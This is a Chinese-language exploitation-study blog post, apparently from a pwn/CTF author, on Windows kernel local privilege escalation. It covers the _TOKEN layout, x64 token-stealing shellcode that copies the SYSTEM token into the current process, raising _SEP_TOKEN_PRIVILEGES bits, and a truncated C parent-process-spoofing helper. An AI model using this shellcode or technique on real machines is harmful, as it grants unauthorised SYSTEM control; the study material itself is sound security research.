@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="关于windows LPE的一些总结 token提权_TOKEN 是一个内核内存结构，描述进程的安全上下文，并包含诸如进程令牌权限、登录 ID、会话 ID、令牌类型（即主令牌与模拟令牌）等信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#x2F;&#x2F;0x498">
+<meta property="og:type" content="article">
+<meta property="og:title" content="winlpe">
+<meta property="og:url" content="https://ixout.github.io/posts/36975/index.html">
+<meta property="og:site_name" content="ixout&#39;s blog">
+<meta property="og:description" content="关于windows LPE的一些总结 token提权_TOKEN 是一个内核内存结构，描述进程的安全上下文，并包含诸如进程令牌权限、登录 ID、会话 ID、令牌类型（即主令牌与模拟令牌）等信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#x2F;&#x2F;0x498">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/dasghdjg23847293.png">
+<meta property="article:published_time" content="2025-05-17T14:44:05.000Z">
+<meta property="article:modified_time" content="2025-05-17T14:45:11.450Z">
+<meta property="article:author" content="ixout">
+<meta property="article:tag" content="winlpe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/dasghdjg23847293.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>winlpe</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/51238/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/36975/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/36975/&text=winlpe"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/36975/&is_video=false&description=winlpe"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=winlpe&body=Check out this article: https://ixout.github.io/posts/36975/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/36975/&title=winlpe"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/36975/&name=winlpe&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/36975/&t=winlpe"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#token%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">token提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Replacing-Tokens-for-Privilege-Escalation"><span class="toc-number">1.1.</span> <span class="toc-text">Replacing Tokens for Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Modifying-Token-Privileges"><span class="toc-number">1.2.</span> <span class="toc-text">Modifying Token Privileges</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#KASLR"><span class="toc-number">2.</span> <span class="toc-text">KASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NtQuerySystemInformation"><span class="toc-number">2.1.</span> <span class="toc-text">NtQuerySystemInformation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SystemModuleInformation"><span class="toc-number">2.1.1.</span> <span class="toc-text">SystemModuleInformation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SystemHandleInformation"><span class="toc-number">2.1.2.</span> <span class="toc-text">SystemHandleInformation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EnumDeviceDrivers"><span class="toc-number">2.2.</span> <span class="toc-text">EnumDeviceDrivers</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#KCFG"><span class="toc-number">3.</span> <span class="toc-text">KCFG</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RtlSetAllBits"><span class="toc-number">3.1.</span> <span class="toc-text">RtlSetAllBits</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RtlClearAllBits"><span class="toc-number">3.2.</span> <span class="toc-text">RtlClearAllBits</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACL%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">ACL提权</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        winlpe
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ixout</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-17T14:44:05.000Z" class="dt-published" itemprop="datePublished">2025-05-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/winlpe/" rel="tag">winlpe</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>关于windows LPE的一些总结</p>
+<h1 id="token提权"><a href="#token提权" class="headerlink" title="token提权"></a>token提权</h1><p><code>_TOKEN</code> 是一个内核内存结构，描述进程的安全上下文，并包含诸如进程令牌权限、登录 ID、会话 ID、令牌类型（即主令牌与模拟令牌）等信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x498 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_SOURCE</span> <span class="title">TokenSource</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">TokenId</span>;</span>                                                   <span class="comment">//0x10</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">AuthenticationId</span>;</span>                                          <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">ParentTokenId</span>;</span>                                             <span class="comment">//0x20</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">ExpirationTime</span>;</span>                                    <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ERESOURCE</span>* <span class="title">TokenLock</span>;</span>                                           <span class="comment">//0x30</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">ModifiedId</span>;</span>                                                <span class="comment">//0x38</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_TOKEN_PRIVILEGES</span> <span class="title">Privileges</span>;</span>                                <span class="comment">//0x40</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_AUDIT_POLICY</span> <span class="title">AuditPolicy</span>;</span>                                   <span class="comment">//0x58</span></span><br><span class="line">    ULONG SessionId;                                                        <span class="comment">//0x78</span></span><br><span class="line">    ULONG UserAndGroupCount;                                                <span class="comment">//0x7c</span></span><br><span class="line">    ULONG RestrictedSidCount;                                               <span class="comment">//0x80</span></span><br><span class="line">    ULONG VariableLength;                                                   <span class="comment">//0x84</span></span><br><span class="line">    ULONG DynamicCharged;                                                   <span class="comment">//0x88</span></span><br><span class="line">    ULONG DynamicAvailable;                                                 <span class="comment">//0x8c</span></span><br><span class="line">    ULONG DefaultOwnerIndex;                                                <span class="comment">//0x90</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES</span>* <span class="title">UserAndGroups</span>;</span>                              <span class="comment">//0x98</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES</span>* <span class="title">RestrictedSids</span>;</span>                             <span class="comment">//0xa0</span></span><br><span class="line">    VOID* PrimaryGroup;                                                     <span class="comment">//0xa8</span></span><br><span class="line">    ULONG* DynamicPart;                                                     <span class="comment">//0xb0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span>* <span class="title">DefaultDacl</span>;</span>                                               <span class="comment">//0xb8</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> _<span class="title">TOKEN_TYPE</span> <span class="title">TokenType</span>;</span>                                             <span class="comment">//0xc0</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> _<span class="title">SECURITY_IMPERSONATION_LEVEL</span> <span class="title">ImpersonationLevel</span>;</span>                  <span class="comment">//0xc4</span></span><br><span class="line">    ULONG TokenFlags;                                                       <span class="comment">//0xc8</span></span><br><span class="line">    UCHAR TokenInUse;                                                       <span class="comment">//0xcc</span></span><br><span class="line">    ULONG IntegrityLevelIndex;                                              <span class="comment">//0xd0</span></span><br><span class="line">    ULONG MandatoryPolicy;                                                  <span class="comment">//0xd4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_LOGON_SESSION_REFERENCES</span>* <span class="title">LogonSession</span>;</span>                     <span class="comment">//0xd8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">OriginatingLogonSession</span>;</span>                                   <span class="comment">//0xe0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES_HASH</span> <span class="title">SidHash</span>;</span>                                <span class="comment">//0xe8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES_HASH</span> <span class="title">RestrictedSidHash</span>;</span>                      <span class="comment">//0x1f8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION</span>* <span class="title">pSecurityAttributes</span>;</span> <span class="comment">//0x308</span></span><br><span class="line">    VOID* Package;                                                          <span class="comment">//0x310</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES</span>* <span class="title">Capabilities</span>;</span>                               <span class="comment">//0x318</span></span><br><span class="line">    ULONG CapabilityCount;                                                  <span class="comment">//0x320</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES_HASH</span> <span class="title">CapabilitiesHash</span>;</span>                       <span class="comment">//0x328</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_LOWBOX_NUMBER_ENTRY</span>* <span class="title">LowboxNumberEntry</span>;</span>                     <span class="comment">//0x438</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_CACHED_HANDLES_ENTRY</span>* <span class="title">LowboxHandlesEntry</span>;</span>                   <span class="comment">//0x440</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION</span>* <span class="title">pClaimAttributes</span>;</span>       <span class="comment">//0x448</span></span><br><span class="line">    VOID* TrustLevelSid;                                                    <span class="comment">//0x450</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN</span>* <span class="title">TrustLinkedToken</span>;</span>                                        <span class="comment">//0x458</span></span><br><span class="line">    VOID* IntegrityLevelSidValue;                                           <span class="comment">//0x460</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_SID_VALUES_BLOCK</span>* <span class="title">TokenSidValues</span>;</span>                           <span class="comment">//0x468</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_LUID_TO_INDEX_MAP_ENTRY</span>* <span class="title">IndexEntry</span>;</span>                        <span class="comment">//0x470</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_TOKEN_DIAG_TRACK_ENTRY</span>* <span class="title">DiagnosticInfo</span>;</span>                     <span class="comment">//0x478</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SEP_CACHED_HANDLES_ENTRY</span>* <span class="title">BnoIsolationHandlesEntry</span>;</span>             <span class="comment">//0x480</span></span><br><span class="line">    VOID* SessionObject;                                                    <span class="comment">//0x488</span></span><br><span class="line">    ULONGLONG VariablePart;                                                 <span class="comment">//0x490</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<p>在描述进程的<code>_EPROCESS</code>有一个Token字段, 但这个字段却不是本进程的<code>_TOKEN</code>, 而是一个<code>_EX_FAST_REF</code>结构体, 当然Object字段指向对应的<code>_TOKEN</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID* Object;                                                       <span class="comment">//0x0</span></span><br><span class="line">        ULONGLONG RefCnt:<span class="number">4</span>;                                                 <span class="comment">//0x0</span></span><br><span class="line">        ULONGLONG Value;                                                    <span class="comment">//0x0</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<p>略微注意RefCnt字段, 在64位系统下, 结构体内存空间是16对齐的, 所以最低4位可以用以存储一些其他信息, 只需要在使用时将这4位清除即可</p>
+<p>进程对应的_TOKEN结构体决定了进程的权限, 如果能在token上做些手脚, 提权自然不在话下</p>
+<h2 id="Replacing-Tokens-for-Privilege-Escalation"><a href="#Replacing-Tokens-for-Privilege-Escalation" class="headerlink" title="Replacing Tokens for Privilege Escalation"></a>Replacing Tokens for Privilege Escalation</h2><p>内核漏洞利用提升权限的一种方式是通过将低权限令牌替换为高权限令牌</p>
+<p>常常是将当前进程的token替换为高权限进程的token, 常用的例如system进程(PID==4)</p>
+<p>流程图类似</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/dasghdjg23847293.png" alt=""></p>
+<p>对应shellcode实例(x64)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">SECTION .start_magic     </span><br><span class="line">db &quot;magic1&quot; </span><br><span class="line"></span><br><span class="line">SECTION .text</span><br><span class="line">;db 0xcc</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, [gs:rax + 188h]        ; gs[0] == KPCR, Get KPCRB.CurrentThread field</span><br><span class="line">    mov rax, [rax+0xb8]     ; Get (KAPC_STATE)ApcState.Process (our EPROCESS)</span><br><span class="line">    mov r9, rax;            ; Backup target EPROCESS at r9</span><br><span class="line"></span><br><span class="line">    ; loop processes list</span><br><span class="line">    mov rax, [rax + 0x448]  ; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link</span><br><span class="line">    mov rax, [rax]          ; Follow the first link</span><br><span class="line">system_process_loop:</span><br><span class="line">    mov rdx, [rax - 0x8]    ; ProcessId</span><br><span class="line">    mov r8, rax;            ; backup system EPROCESS.ActiveProcessLinks pointer at r8</span><br><span class="line">    mov rax, [rax]          ; Next process</span><br><span class="line">    cmp rdx, 4          ; System PID</span><br><span class="line">    jnz system_process_loop</span><br><span class="line"></span><br><span class="line">    mov rdx, [r8 + 0x70]</span><br><span class="line">    and rdx, 0xfffffffffffffff8         ; Ignore ref count</span><br><span class="line">    mov rcx, [r9 + 0x4b8]</span><br><span class="line">    and rcx, 0x7</span><br><span class="line">    add rdx, rcx                ; put target&#x27;s ref count into our token</span><br><span class="line">    mov [r9 + 0x4b8], rdx       ; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff</span><br><span class="line"></span><br><span class="line">    ;db 0xcc</span><br><span class="line">ret_to_usermode:</span><br><span class="line">    ;sti</span><br><span class="line">    mov rax, [gs:0x188]     ; _KPCR.Prcb.CurrentThread</span><br><span class="line">    mov cx, [rax + 0x1e4]       ; KTHREAD.KernelApcDisable</span><br><span class="line">    inc cx</span><br><span class="line">    mov [rax + 0x1e4], cx</span><br><span class="line">    mov rdx, [rax + 0x90]   ; ETHREAD.TrapFrame</span><br><span class="line">    mov rcx, [rdx + 0x168]  ; ETHREAD.TrapFrame.Rip</span><br><span class="line">    mov r11, [rdx + 0x178]  ; ETHREAD.TrapFrame.EFlags</span><br><span class="line">    mov rsp, [rdx + 0x180]  ; ETHREAD.TrapFrame.Rsp</span><br><span class="line">    mov rbp, [rdx + 0x158]  ; ETHREAD.TrapFrame.Rbp</span><br><span class="line">    ;db 0xcc</span><br><span class="line">    xor eax, eax    ; return STATUS_SUCCESS to NtDeviceIoControlFile </span><br><span class="line">    swapgs</span><br><span class="line">    o64 sysret  ; nasm shit</span><br><span class="line"></span><br><span class="line">SECTION .end_magic     </span><br><span class="line">db &quot;magic2&quot; </span><br></pre></td></tr></table></figure>
+<p>对于64位有一个要注意的点:</p>
+<p>之前有提到_EX_FAST_REF结构体的RefCnt字段, 在我们得到目标高权限进程的token后, 首先要去除原先的RefCnt, 然后将低权限进程的RefCnt添加到token</p>
+<p>这样提权后可以直接<code>system(&quot;cmd&quot;)</code>弹出拥有高权限的shell</p>
+<h2 id="Modifying-Token-Privileges"><a href="#Modifying-Token-Privileges" class="headerlink" title="Modifying Token Privileges"></a>Modifying Token Privileges</h2><p>在<code>_TOKEN</code>结构体中存在一个字段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SEP_TOKEN_PRIVILEGES</span> <span class="title">Privileges</span>;</span><span class="comment">//0x40</span></span><br></pre></td></tr></table></figure>
+<p><code>_SEP_TOKEN_PRIVILEGES</code>结构体是<code>_TOKEN</code>结构体真正用于记录权限的部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x18 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SEP_TOKEN_PRIVILEGES</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONGLONG Present;      	  	<span class="comment">//0x0</span></span><br><span class="line">    ULONGLONG Enabled;       		<span class="comment">//0x8</span></span><br><span class="line">    ULONGLONG EnabledByDefault;		<span class="comment">//0x10</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<p>其中Present代表可用权限, Enabled代表可用权限中开启了的部分</p>
+<p>二者的每一个bit位代表着一个权限(当然并没有64个那么多权限, 但是未定义部分置位也不会影响什么), 对于system进程其两者字段都是<code>0x0000001ff2ffffbc</code></p>
+<p>所以如果拥有任意写的能力, 将<code>_SEP_TOKEN_PRIVILEGES</code>的两个字段都置位, 也可以开启当前进程的高权限进行提权</p>
+<p>这样提权就没法直接使用system获取shell了(产生的shell并不会继承高权限)</p>
+<p>所以我们需要利用进程现有的高权限对本就拥有高权限的进程进行注入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">CreateProcessFromHandle</span><span class="params">(HANDLE Handle, LPSTR command)</span> &#123;</span><br><span class="line">	STARTUPINFOEXA si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	SIZE_T size;</span><br><span class="line">	BOOL ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute</span></span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line"></span><br><span class="line">	InitializeProcThreadAttributeList(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;size);</span><br><span class="line">	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(</span><br><span class="line">		GetProcessHeap(),</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		size</span><br><span class="line">	);</span><br><span class="line">	InitializeProcThreadAttributeList(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;size);</span><br><span class="line">	UpdateProcThreadAttribute(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;Handle, <span class="keyword">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	si.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Finally, create the process</span></span><br><span class="line">	ret = CreateProcessA(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		command,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">true</span>,</span><br><span class="line">		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si),</span><br><span class="line">		&amp;pi</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcessFromHandle failed with error = \n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span 